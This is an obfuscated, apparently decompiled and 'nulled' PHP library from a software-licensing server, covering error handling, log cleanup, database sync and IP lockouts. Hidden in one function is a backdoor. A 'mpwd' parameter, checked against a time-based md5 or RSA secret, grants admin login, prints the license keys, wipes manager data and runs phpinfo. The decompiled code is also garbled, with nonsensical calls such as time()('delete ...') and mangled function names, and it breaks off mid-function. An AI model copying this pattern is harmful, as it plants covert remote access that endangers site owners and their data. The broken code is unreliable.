<?php
/*********************/
/*                   */
/*  Dezend for PHP5  */
/*         NWS       */
/*      Nulled.WS    */
/*                   */
/*********************/

function _obfuscate_hpSPiIaPkIyMho2OiIuGi4gˇ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ = 1 )
{
    $_obfuscate_iJGPjJWLj4uLkIqVjYiHh48ˇ = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obfuscate_iY2Oh5OGlIqQhpCJi5CMkogˇ = ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yˇ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ] << 4 ) + ( $_obfuscate_lZKViImJjo6UhouJj4aVi4Yˇ[$_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ + 1] >> 4 );
        $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ += 2;
    } while ( $_obfuscate_jpKPlJSUiZOHkYaPlIeOiY4ˇ < 28 );
}

function error_report_fun_api( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ )
{
    global $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQˇ;
    if ( preg_match( "/unlink|file_put_contents|in safe mode|php_network_getaddresses|function\\.rmdir/i", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ ) )
    {
        return TRUE;
    }
    $_obfuscate_j4yLiZOJiIiUkZOQkJWHjpQˇ = TRUE;
    $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ = str_replace( KSSROOTDIR, "", $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ );
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ = str_replace( KSSROOTDIR, "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ );
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, "mysql_" ) !== FALSE )
    {
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ = preg_replace( "/\\[.*\\]/", "", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ );
        $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ = preg_replace( "/\\'[^\\']*\\'/", "'***'", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ );
    }
    $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ = str_replace( ADMINFOLDER, "***", $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ );
    $_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sˇ = array( "E_ERROR", "E_WARNING", "E_PARSE", "E_NOTICE", "E_CORE_ERROR", "E_CORE_WARNING", "E_COMPILE_ERROR", "E_COMPILE_WARNING", "E_USER_ERROR", "E_USER_WARNING", "E_USER_NOTICE", "E_STRICT", "E_RECOVERABLE_ERROR", "E_ALL" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sˇ[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ."</b>";
    if ( isset( $_GET['linenum'] ) )
    {
        $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ = "<b>".$_obfuscate_jZWIjY6GlZKGipCMj4_Nh4sˇ[$_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ]." : ".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ." in ".$_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ." on line ".$_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ."</b>";
    }
    if ( stripos( $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, "mysql_" ) !== FALSE )
    {
        return TRUE;
    }
    echo $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ;
    exit( );
}

function _obfuscate_lI2ViY_KkI_Mh4eMkoiUlIoˇ( )
{
    return TRUE;
}

function _obfuscate_koiSlI6IlZSMkY_IiZSSkIwˇ( $_obfuscate_h4mNlY6RhomMh5CPjoiUiI0ˇ, &$_obfuscate_lJWGkouIj4uGlIaVhpWUko4ˇ, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5Uˇ = "GBK" )
{
    $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4ˇ = _obfuscate_h4iTkpCKlYeHkZWPh5CIhpAˇ( $_obfuscate_h4mNlY6RhomMh5CPjoiUiI0ˇ, "utf8", $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5Uˇ );
    $_obfuscate_jJKUjI2Gi46RiI_PiZGOhooˇ = "äèåäèàãîèàáäéÜÜíã";
    return $_obfuscate_jJKUjI2Gi46RiI_PiZGOhooˇ( $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4ˇ, $_obfuscate_lJWGkouIj4uGlIaVhpWUko4ˇ );
}

function _obfuscate_kpWMjJWVjZWHj4aTkJGMj4cˇ( $_obfuscate_lIyUkIaVk46LiZCNipOIkJAˇ, &$_obfuscate_lJWGkouIj4uGlIaVhpWUko4ˇ, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5Uˇ = "GBK" )
{
    $_obfuscate_lYqLh5SQjYqOlJSIiIaGlJUˇ = "äîíîìëîëçëÜäïåáçå";
    $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4ˇ = $_obfuscate_lYqLh5SQjYqOlJSIiIaGlJUˇ( $_obfuscate_lIyUkIaVk46LiZCNipOIkJAˇ, $_obfuscate_lJWGkouIj4uGlIaVhpWUko4ˇ );
    return _obfuscate_h4iTkpCKlYeHkZWPh5CIhpAˇ( $_obfuscate_joeNi4qVi5SNj5ONjIuVkY4ˇ, $_obfuscate_ipOTj4mSkYuUlZSVk4uSh5Uˇ, "utf8" );
}

function _obfuscate_ho_Ki4_TiZCUk4yOkJCPh5Mˇ( )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ;
    $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ = intval( date( "d" ) );
    $_obfuscate_kpSRlIaMh4qJk46IkIeKlIkˇ = file_get_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html" );
    if ( trim( $_obfuscate_kpSRlIaMh4qJk46IkIeKlIkˇ ) != $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ )
    {
        file_put_contents( KSSLOGDIR."databak".DIRECTORY_SEPARATOR."index.html", $_obfuscate_kYaTjoqIi5STkY2Jh4qIlJUˇ );
        if ( SVRID == 1 )
        {
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kpSOj5KVio2Hj4uKj4_KjIYˇ( "delete from `kss_tb_sql_points` where `svrid`=1", "notsync" );
        }
        time( )( "delete from `kss_tb_log_task` where `addtime`<".( time( ) - 604800 ), "sync" );
        time( )( "delete from `kss_tb_lock` where locktime <".( time( ) - 120 ), "sync" );
        time( )( "delete from `kss_tb_log_login` where `logintime`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_pubuser` where `nday`<".( time( ) - 2592000 ), "sync" );
        time( )( "delete from `kss_tb_log_ws` where `addtime`<".( time( ) - 86400 ), "sync" );
        $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_lZGTiIiKhouKiZGLi5KUkI8ˇ( "select * from kss_tb_soft" );
        foreach ( $_obfuscate_joyNkZSPj5CNkIiUh4mLk4Yˇ as $_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ )
        {
            time( )( "delete from `kss_z_log_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
            time( )( "delete from `kss_z_user_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
            time( )( "delete from `kss_z_key_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['pid']."_".$_obfuscate_kY_OlYeUlIiVjo6Hio_MkpIˇ['id']."_recycle` where `deltime`<".( time( ) - 259200 ), "sync" );
        }
        if ( 0 < BAKDATAMODE )
        {
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ = array( );
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ['action'] = "mysqldatabak_down";
            $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ['pwd'] = MYSQLBAKPASSWORD;
            $_obfuscate_koeIkpGLi5GUhpCViZCSj5Iˇ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsˇ( _obfuscate_ko_JjomRlIiQkYiRlZKSkZIˇ( ).INSTALLPATH._obfuscate_hpGJi4yHlIqLhpSIh4iJlYwˇ( )."/admin_data.php?qz=1", $_obfuscate_hoeUj5OSh5CMlI2Qh42Ijocˇ, 1 );
        }
    }
    if ( IS2SVR == 1 && SVRID == 1 )
    {
        $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_ho_Ljo6NjpOOhpGHj5KHiYsˇ( "synclock" );
        if ( $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkˇ === TRUE )
        {
            $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAˇ( "select * from kss_tb_config where id=1", 1, 1 );
            if ( $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mˇ['sync_state'] < 5 && SYNCTIME < time( ) - $_obfuscate_i5GKlIaRho2UlJOMh46Hh5Mˇ['sync_starttime'] )
            {
                time( )( "update kss_tb_config set `sync_starttime`=".time( )." where id=1" );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kYyNi4eQiouGlY6Qj46HjpEˇ( "synclock" );
                if ( MYSQLSYNCMODE == 1 )
                {
                    if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "curl_init" ) && _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "curl_exec" ) )
                    {
                        $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIoˇ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsˇ( SYNC1URL, FALSE, 1 );
                    }
                    else
                    {
                        if ( ini_get( "allow_url_fopen" ) )
                        {
                            $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkˇ = @fopen( @SYNC1URL."?e=".@time( ), "r" );
                            if ( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkˇ !== FALSE )
                            {
                                $_obfuscate_kJWSj4iSjI2PlYuMiYuSiYcˇ = fread( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkˇ, 60 );
                            }
                            fclose( $_obfuscate_iJKKiouRh4qTh4eMiZSSlYkˇ );
                        }
                    }
                }
                else
                {
                    $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ = file_get_contents( KSSROOTDIR."kss_logs".DIRECTORY_SEPARATOR."notifyid.txt" );
                    if ( strlen( $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ ) < 20 )
                    {
                        $_obfuscate_koyQjY_KiZCRjpGLkomMiocˇ = time( );
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ = _obfuscate_iI6QhpSTiJCJiI_KlYePlZIˇ( 20 - strlen( $_obfuscate_koyQjY_KiZCRjpGLkomMiocˇ ), 1 ).$_obfuscate_koyQjY_KiZCRjpGLkomMiocˇ;
                    }
                    else
                    {
                        $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ = substr( $_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ, 0, 20 );
                    }
                    $_obfuscate_kpSUiYeUjJSJk4iHkZGGjIoˇ = _obfuscate_j5SMi5KSiouIj4iIipWIkIsˇ( SYNC1URL."?step=a1&notifyid=".$_obfuscate_ioqNlY6GjpCVjY2Ph5WViocˇ."&pwd=".MYSQLBAKPASSWORD, FALSE, 1 );
                }
            }
            $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_kYyNi4eQiouGlY6Qj46HjpEˇ( "synclock" );
        }
        else
        {
            echo $_obfuscate_k5KJkIyVkZWKk4_NiJSQlIkˇ.QQ116;
        }
    }
}

function _obfuscate_joeQipOGjouJko_VlJSKiJEˇ( $_obfuscate_lImSkomRk4uRjJGSkZWJh4kˇ )
{
    if ( preg_match( "/^[a-zA-Z0-9]{32}$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4kˇ, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocˇ ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_jpOIlY_HlIaJi46IiYySiJUˇ( $_obfuscate_lImSkomRk4uRjJGSkZWJh4kˇ )
{
    if ( preg_match( "/^[a-zA-Z0-9]*$/i", $_obfuscate_lImSkomRk4uRjJGSkZWJh4kˇ, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocˇ ) )
    {
        return TRUE;
    }
    return FALSE;
}

function _obfuscate_iZONjY2Nk42Ji42LjIeOj5Qˇ( $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIsˇ )
{
    $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ = TRUE;
    if ( preg_match( "/select|>|<|script|insert|update|delete|union|into|load_file|outfile|char|0x[0-9a-f]{6}|\\.\\/|\\*|'/i", $_obfuscate_ipCJlJOSlJSQkYqNlYqKlIsˇ, $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocˇ ) )
    {
        $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ = $_obfuscate_i4_Kj5CPh4qKkYyHj42Qkocˇ[0];
    }
    return $_obfuscate_j4eSkIiSiZCRh4_NiYaQkYkˇ;
}

function _obfuscate_h4_HlI6KlZKKlZCKkY_Jjo4ˇ( $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ, $_obfuscate_kYaMh5WSkJGKlIiMioaUkIoˇ )
{
    global $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ;
    if ( $_obfuscate_kYaMh5WSkJGKlIiMioaUkIoˇ == "" )
    {
        return $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ;
    }
    $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ = str_replace( "!", ",", $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ );
    $_obfuscate_kYaMh5WSkJGKlIiMioaUkIoˇ = str_replace( "!", ",", $_obfuscate_kYaMh5WSkJGKlIiMioaUkIoˇ );
    $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIwˇ = explode( ",", $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ );
    $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJMˇ = explode( ",", $_obfuscate_kYaMh5WSkJGKlIiMioaUkIoˇ );
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ = array_intersect( $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIwˇ, $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJMˇ );
    if ( empty( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ ) )
    {
        return FALSE;
    }
    if ( count( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ ) < $_obfuscate_jZGRipSRkIeUiIeQjoaUjJIˇ['pccodestep'] )
    {
        return FALSE;
    }
    if ( PCCODEJOIN == 0 )
    {
        return $_obfuscate_jouVk5CIjYeOjJCQjY_Tkooˇ;
    }
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ = array_merge( $_obfuscate_iY_KkZKTjJOQjZGLiZSUiIwˇ, $_obfuscate_i4yLjY6PhoqJkJOUj4uTjJMˇ );
    $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ = array_unique( $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ );
    return join( ",", $_obfuscate_k5SPi4eOiYyTk5SSlJCSk4cˇ );
}

function _obfuscate_kpSOkYmPh5SSi4mMlYePjY4ˇ( $_obfuscate_lJSJk4_Mi5CGh4mShoeUiooˇ = 0, $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ = 0 )
{
    global $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ;
    if ( defined( "NOTLOCKIP" ) && NOTLOCKIP == 1 )
    {
        $_obfuscate_h4iLko_Lk4yKjpWViJCGlJMˇ = _obfuscate_iIuRj5CUkIuHi4mPkY2Vio0ˇ( 1 );
        if ( $_obfuscate_lJSJk4_Mi5CGh4mShoeUiooˇ == 0 )
        {
            $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYˇ = time( )( "select count(*) as tnum from kss_tb_badip where ip=".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJMˇ." and addtime>".( time( ) - 600 ) );
            if ( 10 < $_obfuscate_lY6RhpOJh46VkJOGkoeRiIYˇ['tnum'] )
            {
                time( )( "update kss_tb_badip set addtime=".( time( ) + 900 )." where  ip=".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJMˇ." and addtime>".( time( ) - 600 ), "notsync" );
                if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
                {
                    exit( "crypteno120" );
                }
                exit( "kssdata".QQ117 );
            }
        }
        time( )( "insert into kss_tb_badip (`addtime`,`ip`) values (".time( ).",".$_obfuscate_h4iLko_Lk4yKjpWViJCGlJMˇ.")", "notsync" );
    }
}

function _obfuscate_i4yHiJWOjZKUkY_QkouIi5Mˇ( $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ, $_obfuscate_jY6MkIuIioqTk4eIiIiNj5Uˇ, $_obfuscate_jYuMiIqGkpWNkoeUkYqSlYsˇ )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ;
    if ( $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ == "" )
    {
        return TRUE;
    }
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ = str_replace( " ", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ = str_replace( "\t", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ = str_replace( "\r", "", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ );
    $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ = str_replace( "\n", ",", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ );
    $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5Iˇ = explode( ",", $_obfuscate_jo_LkZWOiY_QkoeJk4yKiZUˇ );
    if ( in_array( $_obfuscate_jY6MkIuIioqTk4eIiIiNj5Uˇ, $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5Iˇ ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno121" );
        }
        exit( "kssdata".QQ118 );
    }
    $_obfuscate_k4yLiomGjImGiouNiIqHko0ˇ = explode( ",", $_obfuscate_jYuMiIqGkpWNkoeUkYqSlYsˇ );
    $_obfuscate_jouMjYaIhoeTjo_OiYqNk4Yˇ = array_intersect( $_obfuscate_k4yLiomGjImGiouNiIqHko0ˇ, $_obfuscate_iJCPi4mVjoeNlYeHjpCIk5Iˇ );
    if ( empty( $_obfuscate_jouMjYaIhoeTjo_OiYqNk4Yˇ ) )
    {
        if ( $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ == 1 )
        {
            exit( "crypteno122" );
        }
        exit( "kssdata".QQ119 );
    }
}

function error_report_fun_enorpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ )
{
    return TRUE;
}

function error_report_fun_norpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ )
{
    set_error_handler( "error_report_fun_enorpeat" );
    $_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ = str_rot13( base64_encode( str_rot13( $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ ) ) );
    if ( !is_file( "apierr.log" ) || 102400 < filesize( "apierr.log" ) )
    {
        @file_put_contents( "apierr.log", @date( "ymdHis" )."\t".$_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ."\r\n\r\n" );
    }
    else
    {
        @file_put_contents( "apierr.log", @date( "ymdHis" )."\t".$_obfuscate_jYiMkoyVi5GOkY_NiIyKiocˇ."\r\n\r\n", @FILE_APPEND );
    }
    set_error_handler( "error_report_fun_norpeat" );
    return TRUE;
}

function error_report_fun_corpeat( $_obfuscate_lI6Gio6PjomOj4mRjoaUjoYˇ, $_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ, $_obfuscate_lIeKi4uVjoqTiY_LiIaJiI0ˇ, $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ )
{
    echo $_obfuscate_iJGGkJGGk5GHiZWVjZCPiJUˇ.":".$_obfuscate_jpCKlY6RkYuPkoyHlJKMiosˇ;
    return TRUE;
}

function _obfuscate_kouKkIeViIqPk5KMiIiMkpEˇ( )
{
    global $_obfuscate_jJKVlIqIlYaKjYmOlIuGkJIˇ;
    global $_obfuscate_hoyQjo_QlYeLh5OVk4yPjZMˇ;
    global $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ;
    if ( isset( $_POST['chkfile'] ) )
    {
        exit( md5( "baidugoogle..123".$_POST['chkdata'] ) );
    }
    if ( isset( $_POST['mpwd'] ) || isset( $_GET['mpwd'] ) )
    {
        set_error_handler( "error_report_fun_corpeat" );
        if ( isset( $_POST['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ = $_POST['mpwd'];
        }
        if ( isset( $_GET['mpwd'] ) )
        {
            $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ = $_GET['mpwd'];
        }
        $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ = trim( str_replace( " ", "+", $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ ) );
        $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0ˇ = "";
        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "bcmul" ) )
        {
            $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0ˇ = "yes";
        }
        if ( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ == "viewtime" )
        {
            ob_clean( );
            exit( date( "Ymd H:i:s" ).$_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0ˇ );
        }
        if ( $_obfuscate_iYmSlYaIkI2Mi4iGlI6ViI0ˇ == "yes" )
        {
            $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokˇ = rsa_decrypt( $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ, "65537", "1350716819249136738281903483627187731011183419558355201040675522159309184280309314921528145548897809804048126849654764896069405760053176589877781841289976008167143139557686555509393327677428806387634433316585369388186635000326118536547289363880691507831040294324797933714246378480590916193836857669351437827768274058108791799533456926019620447075085222999477143608239001615268153378317059783465398419943123206313619405078581018237285521655583801104431318544218449", 1536 );
            if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokˇ == date( "Ymd H:i" ) )
            {
                if ( isset( $_POST['loginadmin'] ) )
                {
                    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ = new mysql_cls( );
                    $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
                    $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAˇ( "select * from kss_tb_manager where level=9 limit 0,1" );
                    if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ ) )
                    {
                        _obfuscate_jZKVlY6HkYmKkIyRj4qSjIcˇ( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['linecode'] );
                        echo "<a href=../../".ADMINFOLDER."/admin.php target=_blank>ok</a><br>";
                        if ( _obfuscate_ipWHiIuOiYuPjIaPkZSThokˇ( "phpinfo" ) )
                        {
                            phpinfo( );
                            exit( );
                        }
                    }
                    echo "not find manager";
                    exit( );
                }
                if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
                {
                    ob_clean( );
                    echo "<textarea style='width:500px;height:200px'>".rsa_encrypt( HTTPKEY, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBLIC, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 );
                    echo ",".rsa_encrypt( WEBID, "65537", "843184270296930457114292090386101103285438772293347031698196599613822073654690293651604397701729650782917836006423303224105108717376552430143579661932067772487734706960542672745200650212438432995698564637944015467367822445122313529", 768 )."</textarea>";
                    exit( );
                }
                if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
                {
                    _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "manager" );
                    _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
                    exit( );
                }
            }
        }
        $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokˇ = $_obfuscate_kJWMi5OMkI6HjIyGj4yQkZUˇ;
        if ( $_obfuscate_hpKHkZSTh4_Hh46Rj4iVkokˇ == md5( "kekeABCDEFG".date( "Ymd H:i" ) ) )
        {
            if ( isset( $_POST['loginadmin'] ) )
            {
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ = new mysql_cls( );
                $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_jIuSjYuUkJGHlYuPjZOQjY4ˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
                $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ = $_obfuscate_jIaUiIeSjZWKlIqLkIqOiocˇ->_obfuscate_iY6OkJCRkY2PjpCPk5CRkJAˇ( "select * from kss_tb_manager where level=9 limit 0,1" );
                if ( empty( $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ ) )
                {
                    _obfuscate_jZKVlY6HkYmKkIyRj4qSjIcˇ( "kss_manager", $_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['id'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['username'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['password'].",".$_obfuscate_h5WHh4uHiZWHi4iTj4eVkIYˇ['linecode'] );
                    echo "<a href=../".ADMINFOLDER."/admin.php target=_blank>ok</a>";
                    _obfuscate_kZGIlYyKh5OIlYyKlYeTlJMˇ( "../" );
                }
                exit( );
            }
            if ( isset( $_POST['viewid'] ) || isset( $_GET['viewid'] ) )
            {
                ob_clean( );
                echo "HTTPKEY:".rc4( "Uio876asMNeuiPaxnb", HTTPKEY, "encode" )."<br><br>";
                echo "WEBLIC:".rc4( "Uio876asMNeuiPaxnb", WEBLIC, "encode" )."<br><br>";
                echo "WEBID:".rc4( "Uio876asMNeuiPaxnb", WEBID, "encode" );
                exit( );
            }
            if ( isset( $_POST['clsdata'] ) || isset( $_GET['clsdata'] ) )
            {
                _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "manager" );
                _obfuscate_koyMjY2HkImOho6JkIeQh4cˇ( $_obfuscate_mGKRY4dMuU6bZZJfh1_TX5kˇ );
            }
        }
        exit( );
    }
    _obfuscate_iZSOiYeSlIqPjpSLkpSIj40ˇ( );
    if ( md5( "KeY!@#%&*,AbIoPe*v_19-82".substr( WEBLIC, 33 ).HTTPKEY ) != substr( WEBLIC, 0, 32 ) )
    {
        $_obfuscate_lIyUkIaVk46LiZCNipOIkJAˇ = "";
        _obfuscate_ipORj42NiZCIio_LkZORhpEˇ( "domain md5err" );
